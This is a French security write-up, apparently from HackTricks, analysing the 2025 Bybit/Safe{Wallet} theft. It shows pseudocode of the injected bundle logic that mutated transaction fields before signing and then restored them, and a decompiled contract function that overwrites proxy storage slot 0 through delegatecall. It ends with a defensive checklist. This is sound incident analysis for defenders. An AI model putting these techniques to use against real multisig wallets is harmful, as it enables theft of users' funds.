# Compromission du flux de signature Web3 & prise de contrôle du proxy Safe via delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Une chaîne de vol de cold-wallet a combiné une **compromission de la supply-chain de l'interface web Safe{Wallet}** avec une **primitive on-chain delegatecall qui a écrasé le pointeur d'implémentation d'un proxy (slot 0)**. Les points clés sont :

- Si une dApp peut injecter du code dans le chemin de signature, elle peut amener un signataire à produire une **signature EIP-712 valide sur des champs choisis par l'attaquant** tout en restaurant les données UI originales, de sorte que les autres signataires ne s'en aperçoivent pas.
- Les proxies Safe stockent `masterCopy` (implémentation) au **storage slot 0**. Un delegatecall vers un contrat qui écrit dans le slot 0 « met à niveau » le Safe vers la logique de l'attaquant, donnant le contrôle total du wallet.

## Hors chaîne : Mutation ciblée de la signature dans Safe{Wallet}

Un bundle Safe altéré (`_app-*.js`) a ciblé sélectivement des adresses Safe et signataires spécifiques. La logique injectée s'exécutait juste avant l'appel de signature :
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated** : des listes blanches codées en dur pour les Safes/signers des victimes ont réduit le bruit et abaissé la détection.
- **Last-moment mutation** : les champs (`to`, `data`, `operation`, gas) étaient écrasés immédiatement avant `signTransaction`, puis restaurés, de sorte que les payloads de proposition dans l'UI semblaient bénins alors que les signatures correspondaient au payload de l'attaquant.
- **EIP-712 opacity** : les wallets affichaient des données structurées mais ne décodaient pas le calldata imbriqué ni ne mettaient en évidence `operation = delegatecall`, rendant le message muté effectivement signé à l'aveugle.

### Gateway validation relevance
Les propositions Safe sont soumises au **Safe Client Gateway**. Avant les contrôles renforcés, la gateway pouvait accepter une proposition où `safeTxHash`/signature correspondait à des champs différents du corps JSON si l'UI les réécrivait après la signature. Après l'incident, la gateway rejette désormais les propositions dont le hash/signature ne correspondent pas à la transaction soumise. Une vérification serveur similaire du hash doit être imposée sur toute API d'orchestration de signature.

### 2025 Bybit/Safe incident highlights
- Le 21 février 2025, le drain du cold-wallet Bybit (~401k ETH) a réutilisé le même schéma : un bundle Safe S3 compromis ne se déclenchait que pour les signers Bybit et remplaçait `operation=0` → `1`, pointant `to` vers un contrat d'attaquant pré-déployé qui écrit le slot 0.
- Le fichier mis en cache par Wayback `_app-52c9031bfa03da47.js` montre la logique basée sur le Safe de Bybit (`0x1db9…cf4`) et les adresses des signers, puis a été immédiatement rollbacké vers un bundle propre deux minutes après l'exécution, reflétant l'astuce “mutate → sign → restore”.
- Le contrat malveillant (par ex. `0x9622…c7242`) contenait des fonctions simples `sweepETH/sweepERC20` plus un `transfer(address,uint256)` qui écrit le slot d'implementation. L'exécution de `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` a déplacé l'implementation du proxy et accordé le contrôle total.

## On-chain: Delegatecall proxy takeover via slot collision

Les proxies Safe conservent `masterCopy` au **storage slot 0** et délèguent toute la logique à celui-ci. Parce que Safe supporte **`operation = 1` (delegatecall)**, toute transaction signée peut pointer vers un contrat arbitraire et exécuter son code dans le contexte de stockage du proxy.

Un contrat attaquant a imité un ERC-20 `transfer(address,uint256)` mais a écrit `_to` dans le slot 0 :
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Chemin d'exécution:
1. Les victimes signent `execTransaction` avec `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Le Safe masterCopy valide les signatures sur ces paramètres.
3. Le proxy exécute un delegatecall vers `attackerContract` ; le corps de `transfer` écrit dans le slot 0.
4. Le slot 0 (`masterCopy`) pointe maintenant vers une logique contrôlée par l'attaquant → **prise de contrôle complète du wallet et vidage des fonds**.

### Notes Guard & version (renforcement post-incident)
- Les Safes >= v1.3.0 peuvent installer un **Guard** pour interdire `delegatecall` ou appliquer des ACL sur `to`/selectors ; Bybit utilisait v1.1.1, donc aucun hook Guard n'existait. Mettre à jour les contrats (et ré-ajouter les propriétaires) est requis pour obtenir ce plan de contrôle.

## Checklist détection & renforcement

- **Intégrité de l'UI** : épingler les assets JS / SRI ; surveiller les diffs de bundle ; considérer l'UI de signature comme faisant partie de la frontière de confiance.
- **Validation au moment de la signature** : hardware wallets avec **EIP-712 clear-signing** ; afficher explicitement `operation` et décoder la calldata imbriquée. Refuser la signature lorsque `operation = 1` sauf si la politique l'autorise.
- **Vérifications côté serveur des hash** : les gateways/services qui relaient les propositions doivent recalculer `safeTxHash` et valider que les signatures correspondent aux champs soumis.
- **Politiques/listes blanches** : règles préalables pour `to`, selectors, types d'actifs, et interdire `delegatecall` sauf pour des flux validés. Exiger un service de politique interne avant de diffuser des transactions entièrement signées.
- **Conception des contrats** : éviter d'exposer des `delegatecall` arbitraires dans les multisig/treasury wallets sauf si strictement nécessaire. Placer les pointeurs d'upgrade à l'écart du slot 0 ou les protéger avec une logique d'upgrade explicite et un contrôle d'accès.
- **Surveillance** : alerter sur les exécutions de `delegatecall` provenant de wallets détenant des fonds de trésorerie, et sur les propositions qui modifient `operation` par rapport aux schémas typiques de `call`.

## Références

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
